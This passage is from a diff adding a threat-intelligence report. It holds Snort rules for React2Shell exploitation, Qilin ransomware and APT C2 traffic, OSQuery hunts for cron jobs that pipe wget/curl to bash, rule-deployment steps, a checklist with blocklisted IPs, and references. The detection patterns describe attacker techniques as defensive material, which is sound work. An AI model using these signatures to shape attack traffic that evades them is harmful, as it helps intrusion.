+            ($python_shebang and 2 of ($python_import*)) or
+            (2 of ($c2_*)) or
+            (2 of ($systemd_persist*))
+        ) and
+        (1 of ($rat_command*))
+}
+```
+
+---
+
+### **9.3 SNORT/SURICATA RULES (Network Detection) - 3 Rules**
+
+#### **Snort Rule 1: CVE-2025-55182 React2Shell Exploitation**
+
+```
+alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
+    msg:"MALWARE CVE-2025-55182 React2Shell Exploitation Attempt";
+    flow:established,to_server;
+    content:"POST"; http_method;
+    content:"/"; http_uri; depth:1;
+    pcre:"/\/(\_next|api)\//U";
+    content:"next-action|3a|"; http_header; nocase;
+    content:"$@"; http_client_body; depth:100;
+    reference:cve,2025-55182;
+    reference:url,github.com/facebook/react/security/advisories;
+    classtype:web-application-attack;
+    sid:1000001;
+    rev:1;
+    metadata:created_at 2025_12_09, attack_target Server, cve CVE-2025-55182;
+)
+
+alert tcp $EXTERNAL_NET any -> $HOME_NET $HTTP_PORTS (
+    msg:"MALWARE CVE-2025-55182 React2Shell Exploitation POST with resolved_model";
+    flow:established,to_server;
+    content:"POST"; http_method;
+    content:"rsc-action-id"; http_header; nocase;
+    content:"|22|status|22 3a 22|resolved_model|22|"; http_client_body;
+    reference:cve,2025-55182;
+    classtype:trojan-activity;
+    sid:1000002;
+    rev:1;
+    metadata:created_at 2025_12_09, attack_target Server, confidence High;
+)
+```
+
+---
+
+#### **Snort Rule 2: Qilin Ransomware C2 Communication**
+
+```
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
+    msg:"RANSOMWARE Qilin Exfiltration via HTTPS";
+    flow:established,to_server;
+    content:"POST"; http_method;
+    content:".onion"; http_header; nocase;
+    content:"multipart/form-data"; http_header; nocase;
+    threshold:type both, track by_src, count 10, seconds 60;
+    reference:url,checkpoint.com/cyber-hub/threat-prevention/ransomware/qilin-ransomware;
+    classtype:data-loss;
+    sid:1000003;
+    rev:1;
+    metadata:created_at 2025_12_09, malware_family Qilin, attack_target Client_and_Server;
+)
+
+alert tcp $HOME_NET any -> $EXTERNAL_NET any (
+    msg:"RANSOMWARE Qilin TOR C2 Beacon";
+    flow:established,to_server;
+    content:"|16 03|"; depth:2;
+    content:".onion"; distance:0;
+    flowbits:set,qilin.c2;
+    flowbits:noalert;
+    reference:url,hhs.gov/sites/default/files/qilin-threat-profile-tlpclear.pdf;
+    classtype:trojan-activity;
+    sid:1000004;
+    rev:1;
+    metadata:created_at 2025_12_09, malware_family Qilin;
+)
+```
+
+---
+
+#### **Snort Rule 3: CL-STA-1015 APT C2 Communication**
+
+```
+alert tcp $HOME_NET any -> 115.42.60.223 61236 (
+    msg:"APT CL-STA-1015 (UNC5174) C2 Communication to Known Infrastructure";
+    flow:established,to_server;
+    content:"GET"; http_method;
+    content:"/slt"; http_uri;
+    reference:url,unit42.paloaltonetworks.com/cve-2025-55182-react2shell-vulnerability;
+    classtype:trojan-activity;
+    sid:1000005;
+    rev:1;
+    metadata:created_at 2025_12_09, threat_group CL-STA-1015, attack_target Server;
+)
+
+alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
+    msg:"APT CL-STA-1015 SNOWLIGHT WebShell Communication";
+    flow:established,to_server;
+    content:"POST"; http_method;
+    content:".php"; http_uri;
+    content:"cmd="; http_client_body; depth:20;
+    pcre:"/cmd=[a-zA-Z0-9\+\/]{20,}/P";
+    reference:url,aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups;
+    classtype:web-application-attack;
+    sid:1000006;
+    rev:1;
+    metadata:created_at 2025_12_09, threat_group CL-STA-1015, malware SNOWLIGHT;
+)
+```
+
+---
+
+### **9.4 OSQUERY QUERIES (Endpoint Hunting) - 2 Queries**
+
+#### **OSQuery Query 1: Detect Suspicious Cron Jobs (React2Shell Persistence)**
+
+```sql
+-- Detects suspicious cron jobs indicative of CVE-2025-55182 post-exploitation persistence
+-- Platform: Linux
+-- Use case: Threat Hunting for React2Shell persistence mechanisms
+
+SELECT 
+    c.event AS cron_event,
+    c.command AS cron_command,
+    c.path AS cron_file_path,
+    c.minute,
+    c.hour,
+    c.day_of_month,
+    c.month,
+    c.day_of_week,
+    f.mtime AS file_modified_time,
+    f.ctime AS file_created_time,
+    f.uid AS file_owner_uid,
+    u.username AS file_owner
+FROM crontab c
+LEFT JOIN file f ON c.path = f.path
+LEFT JOIN users u ON f.uid = u.uid
+WHERE 
+    -- Hunt for cron jobs with network activity
+    (c.command LIKE '%wget%' OR c.command LIKE '%curl%')
+    -- Hunt for cron jobs executing scripts from /tmp
+    OR c.command LIKE '%/tmp/%'
+    -- Hunt for @reboot persistence
+    OR c.event = '@reboot'
+    -- Hunt for minute-based persistence (every minute)
+    OR (c.minute = '*' AND c.hour = '*')
+    -- Hunt for cron jobs piping to bash
+    OR c.command LIKE '%| bash%'
+    OR c.command LIKE '%| sh%'
+ORDER BY f.mtime DESC;
+```
+
+---
+
+#### **OSQuery Query 2: Detect Suspicious Systemd User Services (APT36 Persistence)**
+
+```sql
+-- Detects suspicious systemd user services indicative of APT36 persistence
+-- Platform: Linux
+-- Use case: Threat Hunting for APT36 Python RAT persistence
+
+SELECT 
+    s.name AS service_name,
+    s.fragment_path AS service_file_path,
+    s.load_state,
+    s.active_state,
+    s.sub_state,
+    s.description,
+    f.mtime AS file_modified_time,
+    f.ctime AS file_created_time,
+    f.size AS file_size,
+    f.uid AS file_owner_uid,
+    u.username AS file_owner,
+    hash.sha256 AS file_sha256
+FROM systemd_units s
+LEFT JOIN file f ON s.fragment_path = f.path
+LEFT JOIN users u ON f.uid = u.uid
+LEFT JOIN hash ON hash.path = f.path
+WHERE 
+    -- Focus on user-level services (not system services)
+    s.fragment_path LIKE '/home/%/.config/systemd/user/%'
+    -- Service is loaded and active (indicating persistence)
+    AND s.load_state = 'loaded'
+    AND s.active_state = 'active'
+    -- Hunt for services executing Python or shell scripts
+    AND (
+        s.fragment_path LIKE '%.service'
+        OR s.description LIKE '%python%'
+        OR s.description LIKE '%bash%'
+        OR s.description LIKE '%sh%'
+    )
+    -- Recently created or modified services (last 30 days)
+    AND (f.mtime > (strftime('%s','now') - 2592000) OR f.ctime > (strftime('%s','now') - 2592000))
+ORDER BY f.mtime DESC;
+```
+
+---
+
+## HOW TO DEPLOY THESE RULES TO YOUR ENVIRONMENT
+
+### **Sigma Rules → Your SIEM Platform:**
+
+**Splunk:**
+```bash
+# Install sigma tool
+pip install sigma-cli
+
+# Convert Sigma rule to Splunk SPL
+sigmac -t splunk CVE-2025-55182_Detection.yml > splunk_detection.spl
+
+# Import to Splunk via saved search or alert
+```
+
+**Microsoft Sentinel:**
+```bash
+# Convert Sigma rule to KQL
+sigma convert -t microsoft365defender CVE-2025-55182_Detection.yml > sentinel_detection.kql
+
+# Create Analytics Rule in Sentinel via Azure Portal or API
+```
+
+**Elastic Security:**
+```bash
+# Convert Sigma rule to Elastic Query DSL
+sigmac -t elasticsearch CVE-2025-55182_Detection.yml > elastic_detection.json
+
+# Import as Detection Rule via Kibana > Security > Rules
+```
+
+**QRadar:**
+```bash
+# Convert Sigma rule to QRadar AQL
+sigmac -t qradar CVE-2025-55182_Detection.yml > qradar_detection.aql
+
+# Create Custom Rule Engine (CRE) rule in QRadar Console
+```
+
+**Generic SIEM (Manual Adaptation):**
+1. Review Sigma rule `detection` section for logical conditions
+2. Map Sigma field names to your SIEM's log source fields (e.g., `cs-method` → `http.method`)
+3. Translate Boolean logic (`and`, `or`, `not`) to your SIEM's query syntax
+4. Test on historical data, tune for false positives, deploy as scheduled search or alert
+
+---
+
+### **YARA Rules → Your Endpoint/File Analysis Tools:**
+
+**EDR Platforms (CrowdStrike, Carbon Black, SentinelOne):**
+```bash
+# CrowdStrike Falcon: Deploy via Custom IOA Rules
+# 1. Navigate to Configuration > Custom IOA Rules > Create Rule
+# 2. Select "YARA" as rule type, paste YARA rule content
+# 3. Set severity (Critical/High) and response actions (Alert/Block)
+
+# Carbon Black Response/EDR: Import as Binary Analysis Rule
+# 1. Navigate to Analysis > Binary Analysis > Add Rule
+# 2. Paste YARA rule, configure alert actions
+```
+
+**File Scanners (THOR, Loki, VirusTotal):**
+```bash
+# THOR Scanner (Nextron Systems)
+# Place YARA rules in: /opt/thor/signatures/yara/custom/
+thor-lite --yaraScan /path/to/scan --allharddrives
+
+# Loki (Simple IOC Scanner)
+python loki.py -p /path/to/scan --yara-rules /path/to/yara/rules/
+
+# VirusTotal Hunting (retrohunting)
+# Upload YARA rule to VirusTotal → Hunting → Create Ruleset
+```
+
+**Velociraptor:**
+```yaml
+# Create YARA artifact for Velociraptor
+name: Custom.YARA.React2Shell
+description: Hunt for React2Shell cryptominer artifacts
+sources:
+  - query: |
+      SELECT * FROM yara(
+        rules='''[PASTE YARA RULE HERE]''',
+        files='/tmp/**',
+        accessor='file'
+      )
+```
+
+---
+
+### **Snort/Suricata Rules → Your Network Detection:**
+
+**Snort 2.x/3.x:**
+```bash
+# Add rules to local.rules
+sudo nano /etc/snort/rules/local.rules
+# Paste Snort rules, save file
+
+# Restart Snort service
+sudo systemctl restart snort
+
+# Verify rule syntax
+snort -T -c /etc/snort/snort.conf
+```
+
+**Suricata 6.x+:**
+```bash
+# Add rules to custom.rules
+sudo nano /etc/suricata/rules/custom.rules
+# Paste Suricata rules, save file
+
+# Reference custom.rules in suricata.yaml
+sudo nano /etc/suricata/suricata.yaml
+# Under rule-files: add "- custom.rules"
+
+# Reload Suricata rules
+sudo suricatasc -c reload-rules
+```
+
+**Palo Alto Firewall (Custom Threat Signatures):**
+1. Navigate to Objects > Custom Objects > Signatures
+2. Create new signature, select "Snort" format
+3. Paste Snort rule content, map to appropriate threat category (Command-and-Control, Malware, etc.)
+4. Apply signature to security policies
+
+**AWS Network Firewall:**
+```bash
+# Create Suricata-compatible rule group
+aws network-firewall create-rule-group \
+    --rule-group-name "React2Shell-Detection" \
+    --type STATEFUL \
+    --rules file://suricata_rules.txt \
+    --capacity 100
+```
+
+---
+
+### **OSQuery Queries → Your Endpoint Monitoring:**
+
+**Fleet (osquery management):**
+1. Navigate to Queries → New Query
+2. Paste OSQuery SQL, set query frequency (e.g., every 3600 seconds)
+3. Save as scheduled query or run as live query against fleet
+
+**Velociraptor (VQL adaptation):**
+```sql
+-- Convert OSQuery to VQL for Velociraptor
+SELECT * FROM osquery(query='''
+  [PASTE OSQUERY SQL HERE]
+''')
+```
+
+**Kolide:**
+1. Navigate to Queries → Create Query
+2. Paste OSQuery SQL, configure as check or scheduled query
+3. Set alerting thresholds and notification channels
+
+**Native OSQuery:**
+```bash
+# Add query to osquery.conf scheduled queries
+sudo nano /etc/osquery/osquery.conf
+
+# Add under "schedule":
+"schedule": {
+  "react2shell_cron_hunt": {
+    "query": "[PASTE OSQUERY SQL]",
+    "interval": 3600,
+    "description": "Hunt for React2Shell persistence"
+  }
+}
+
+# Restart osquery
+sudo systemctl restart osqueryd
+```
+
+---
+
+## DEFENSIVE RECOMMENDATIONS
+
+### **IMMEDIATE (0-24 hours) - CRITICAL ACTIONS**
+
+- [ ] **Deploy React/Next.js Patches:** Upgrade all React Server Components to 19.0.1, 19.1.2+ and Next.js to 15.1.6, 16.0.0-rc.1+ immediately. Prioritize internet-facing applications.
+
+- [ ] **Apply Microsoft December Patches:** Install KB5048667 (Windows 10/11) and KB5048663 (Server 2022) to remediate CVE-2025-62221 before CISA KEV deadline (Dec 30).
+
+- [ ] **Update Android Devices:** Deploy December 2025 security patches (2025-12-01 or 2025-12-05 patch levels) to address CVE-2025-48633/48572 before CISA deadline (Dec 23).
+
+- [ ] **Block Known Malicious IPs:** Add IOCs to firewall deny lists: 156.67.221.96, 45.76.155.14, 115.42.60.223, 194.69.203.32, 193.34.213.150, 80.64.16.241, 20.193.135.188.
+
+- [ ] **Hunt for CVE-2025-55182 Compromise:** Review web application logs for POST requests with `next-action`/`rsc-action-id` headers dating back to December 3, 2025. Check for `/tmp/kinsing`, `/tmp/kdevtmpfsi` processes.
+
+- [ ] **Deploy WAF Rules:** Implement temporary web application firewall rules blocking CVE-2025-55182 exploitation patterns (`$@` in POST bodies to RSC endpoints) until patching complete.
+
+- [ ] **Audit Cron Jobs:** Scan all Linux systems for suspicious cron entries with network activity: `for user in $(cut -f1 -d: /etc/passwd); do crontab -u $user -l 2>/dev/null; done | grep -E "(wget|curl|http)"`.
+
+- [ ] **Enable PowerShell Logging:** Activate Script Block Logging (Event ID 4104) and Module Logging on all Windows systems to detect CVE-2025-54100 exploitation attempts.
+
+- [ ] **Disable Office Preview Pane:** Push Group Policy to disable Preview Pane for Outlook and File Explorer: `HKCU\Software\Microsoft\Windows\CurrentVersion\PreviewHandlers` (remove Office handlers).
+
+- [ ] **Scan for Qilin BYOVD Drivers:** Search all Windows systems for `gdrv.sys`, `dbutil_2_3.sys`, `vboxdrv.sys` in non-standard locations (anywhere outside legitimate software install paths).
+
+---
+
+### **SHORT-TERM (24-72 hours) - HIGH PRIORITY**
+
+- [ ] **Deploy Sigma Detection Rules:** Convert and implement the 4 Sigma rules from Section 9.1 to your SIEM platform using sigmac/pySigma tools for automated threat detection.
+
+- [ ] **Implement YARA Scanning:** Deploy the 3 YARA rules from Section 9.2 to EDR platforms and file scanners, scheduling weekly full-disk scans on critical servers.
+
+- [ ] **Configure Network IDS:** Import the 3 Snort/Suricata rules from Section 9.3 to IDS/IPS infrastructure, enabling alerting and blocking modes for high-confidence detections.
+
+- [ ] **Conduct Threat Hunting Campaign:** Execute OSQuery queries from Section 9.4 across all Linux endpoints to identify persistence mechanisms, suspicious systemd services, and malicious cron jobs.
+
+- [ ] **Review Third-Party Vendor Access:** Audit MSP and vendor access to critical systems, enforce MFA for all remote access, and segment vendor connections from production networks.
+
+- [ ] **Rotate Compromised Credentials:** If CVE-2025-55182 exploitation suspected, rotate all AWS/Azure/GCP credentials, SSH keys, database passwords, and API keys for potentially exposed applications.
+
+- [ ] **Harden Cloud Metadata Endpoints:** Implement network-level blocking of IMDSv1 (169.254.169.254) from application containers, enforce IMDSv2 with token authentication (AWS) or managed identity (Azure).
+
+- [ ] **Implement Egress Filtering:** Block outbound connections to known cryptomining pools (TCP 3333, 8443, 14433) and TOR exit nodes to disrupt C2 communication and data exfiltration.
+
+- [ ] **Deploy EDR Anti-Tampering:** Enable Tamper Protection in Windows Defender, CrowdStrike Falcon, or equivalent EDR solutions to prevent Qilin BYOVD driver attacks from terminating security agents.
+
+- [ ] **Test Backup Restoration:** Verify integrity of offline/immutable backups by performing test restorations to isolated environments, ensuring recovery capability in ransomware scenarios.
+
+---
+
+### **ONGOING (Strategic) - LONG-TERM RESILIENCE**
+
+- [ ] **Establish Vulnerability Management SLA:** Define maximum remediation timeframes for Critical (7 days), High (14 days), and Medium (30 days) severity vulnerabilities aligned with CISA KEV requirements.
+
+- [ ] **Implement Zero Trust Architecture:** Deploy identity-based network segmentation, enforce least-privilege access, and require MFA for all privileged operations to limit lateral movement.
+
+- [ ] **Enhance SIEM Detection Coverage:** Expand SIEM log collection to include cloud control plane logs (CloudTrail, Azure Activity, GCP Audit), container runtime logs, and EDR telemetry.
+
+- [ ] **Deploy Deception Technology:** Implement honeypots, canary tokens, and decoy credentials throughout the environment to detect unauthorized access and lateral movement early.
+
+- [ ] **Conduct Purple Team Exercises:** Schedule quarterly adversary emulation exercises testing defenses against CVE-2025-55182 exploitation, Qilin ransomware TTPs, and APT36 phishing campaigns.
+
+- [ ] **Establish Threat Intelligence Program:** Subscribe to commercial threat feeds (Recorded Future, CrowdStrike Falcon Intelligence), automate IOC ingestion to SIEM/EDR, and participate in ISACs (FS-ISAC, H-ISAC).
+
+- [ ] **Develop Incident Response Playbooks:** Create specific runbooks for React2Shell exploitation, ransomware outbreaks, and APT intrusions with pre-defined escalation paths and containment procedures.
+
+- [ ] **Implement Application Security Testing:** Integrate SAST/DAST into CI/CD pipelines to identify insecure deserialization vulnerabilities similar to CVE-2025-55182 before production deployment.
+
+- [ ] **Harden Supply Chain Security:** Mandate security questionnaires for all third-party vendors, conduct annual vendor security assessments, and require SOC 2 Type II or ISO 27001 certification.
+
+- [ ] **Enhance Security Awareness Training:** Deploy quarterly phishing simulations mimicking APT36 .desktop file attacks, Office Preview Pane exploits, and social engineering campaigns used by ransomware groups.
+
+---
+
+## RESOURCES & REFERENCES
+
+### **Official Vendor Advisories:**
+
+- **CVE-2025-55182 (React2Shell):**
+  - Meta React Security Advisory: https://github.com/facebook/react/security/advisories
+  - Next.js Security Advisory: https://github.com/vercel/next.js/security/advisories
+  - NVD Entry: https://nvd.nist.gov/vuln/detail/CVE-2025-55182
+
+- **CVE-2025-62221 (Windows Cloud Files Driver):**
+  - Microsoft Security Response Center: https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-62221
+  - Microsoft Patch Tuesday December 2025: https://msrc.microsoft.com/update-guide/releaseNote/2025-Dec
+
+- **CVE-2025-48633 / CVE-2025-48572 (Android Framework):**
+  - Android Security Bulletin December 2025: https://source.android.com/docs/security/bulletin/2025-12-01
+  - Google Security Blog: https://security.googleblog.com/
+
+- **CVE-2025-62554 / CVE-2025-62557 (Microsoft Office RCE):**
+  - Microsoft Office Security Updates: https://learn.microsoft.com/en-us/officeupdates/microsoft365-apps-security-updates
+
+---
+
+### **Threat Intelligence Sources:**
+
+- **CVE-2025-55182 Post-Exploitation Analysis:**
+  - Unit 42 (Palo Alto Networks): https://unit42.paloaltonetworks.com/cve-2025-55182-react2shell-vulnerability
+  - Wiz Threat Research: https://www.wiz.io/blog/critical-vulnerability-in-react-cve-2025-55182
+  - Datadog Security Labs: https://securitylabs.datadoghq.com/articles/cve-2025-55182-react2shell-remote-code-execution
+  - AWS Security Blog (China-Nexus Groups): https://aws.amazon.com/blogs/security/china-nexus-cyber-threat-groups-rapidly-exploit-react2shell
+
+- **Qilin Ransomware Threat Profiles:**
+  - Check Point Research: https://www.checkpoint.com/cyber-hub/threat-prevention/ransomware/qilin-ransomware/
+  - US HHS Qilin Threat Profile (TLP:CLEAR): https://www.hhs.gov/sites/default/files/qilin-threat-profile-tlpclear.pdf
+  - AttackIQ Qilin Analysis: https://www.attackiq.com/2025/11/19/revisiting-qilin-ransomware/
+
+- **APT36 Campaign Analysis:**
+  - Hunt.io APT36 ClickFix Campaign: https://hunt.io/blog/apt36-clickfix-campaign-indian-ministry-of-defence
+  - SOCPrime APT36 Python ELF Malware: https://socprime.com/active-threats/apt36-deploys-python-elf-malware/
+  - Tata Communications Threat Advisory (December 9, 2025): https://www.tatacommunications.com/threat-intelligence-advisory-9-december-2025.pdf
+
+- **China-Nexus APT Activity:**
+  - Joint Cybersecurity Advisory (NSA/CISA/FBI): https://www.cisa.gov/news-events/cybersecurity-advisories
+  - Kaspersky ICS-CERT Q3 2025 APT Report: https://ics-cert.kaspersky.com/publications/reports/2025/12/01/apt-financial-attacks-industrial-q3-2025
+
+---
+
+### **Detection Rule Conversion Tools:**
+
+- **Sigma:**
+  - Sigma Repository: https://github.com/SigmaHQ/sigma
+  - pySigma (Python Sigma Converter): https://github.com/SigmaHQ/pySigma
+  - Sigma Converter Web Interface: https://sigmahq.io/
+  - Sigma Rules Specification: https://sigmahq.io/docs/basics/rules.html
+
+- **YARA:**
+  - YARA Repository: https://github.com/VirusTotal/yara
+  - YARA Documentation: https://yara.readthedocs.io/
+  - YARA-Rules Community Repository: https://github.com/Yara-Rules/rules
+  - Neo23x0 Signature Base: https://github.com/Neo23x0/signature-base
+
+- **Snort/Suricata:**
+  - Snort Rules Download: https://www.snort.org/downloads#rule-downloads
+  - Emerging Threats Ruleset: https://rules.emergingthreats.net/
+  - Suricata Rules Documentation: https://suricata.readthedocs.io/en/latest/rules/index.html
+  - Cisco Talos Intelligence Rules: https://www.snort.org/advisories
+
+---
+
+### **Detection Rule Repositories:**
+
+- **Sigma Rules:**
+  - SigmaHQ Main Repository: https://github.com/SigmaHQ/sigma/tree/master/rules
+  - SigmaHQ Windows Rules: https://github.com/SigmaHQ/sigma/tree/master/rules/windows
+  - SigmaHQ Linux Rules: https://github.com/SigmaHQ/sigma/tree/master/rules/linux
+  - SigmaHQ Cloud Rules: https://github.com/SigmaHQ/sigma/tree/master/rules/cloud
+
+- **YARA Rules:**
+  - Yara-Rules Community: https://github.com/Yara-Rules/rules
+  - ReversingLabs YARA Rules: https://github.com/reversinglabs/reversinglabs-yara-rules
+  - Nextron Valhalla (Commercial): https://valhalla.nextron-systems.com
+  - Malpedia YARA Rules: https://malpedia.caad.fkie.fraunhofer.de/
+
+- **Snort/Suricata Rules:**
+  - Snort Community Rules: https://www.snort.org/downloads#rule-downloads
+  - Emerging Threats Open: https://rules.emergingthreats.net/open/
+  - Proofpoint ET Pro (Commercial): https://www.proofpoint.com/us/products/et-pro-ruleset
+
+- **OSQuery Packs:**
+  - OSQuery GitHub Repository: https://github.com/osquery/osquery/tree/master/packs
+  - Palantir OSQuery Configuration: https://github.com/palantir/osquery-configuration
+  - Kolide Fleet Packs: https://fleetdm.com/queries
+
+---
+
+### **CISA KEV Catalog and Government Resources:**
+
+- **CISA Known Exploited Vulnerabilities Catalog:** https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+- **CISA Binding Operational Directive 22-01:** https://www.cisa.gov/news-events/directives/bod-22-01-reducing-significant-risk-known-exploited-vulnerabilities
+- **CISA Cybersecurity Advisories:** https://www.cisa.gov/news-events/cybersecurity-advisories
+- **NSA Cybersecurity Advisories:** https://www.nsa.gov/Press-Room/Cybersecurity-Advisories-Guidance/
+
+---
+
+### **Threat Actor Tracking and Attribution:**
+
+- **MITRE ATT&CK Framework:** https://attack.mitre.org
+- **MITRE ATT&CK Groups (APT36):** https://attack.mitre.org/groups/G0134/
+- **CrowdStrike Adversary Universe (CL-STA-1015/UNC5174):** https://www.crowdstrike.com/adversaries/
+- **Mandiant Threat Intelligence (UNC Groups):** https://www.mandiant.com/resources/blog
+
+---
+
+**Report Generated:** December 9, 2025, 9:00 PM AST  
+**Next Report:** December 16, 2025 (Covering December 9-16, 2025)  
+**Distribution:** TLP:CLEAR - Approved for public distribution and community sharing
+
+---
+
+**Feedback and Contributions:** This report format is designed for continuous improvement. Security teams are encouraged to share detection effectiveness metrics, false positive rates, and additional IOCs discovered through threat hunting operations. Submit feedback to your organization's threat intelligence team or participate in community intelligence sharing via FS-ISAC, H-ISAC, or regional CERTs.
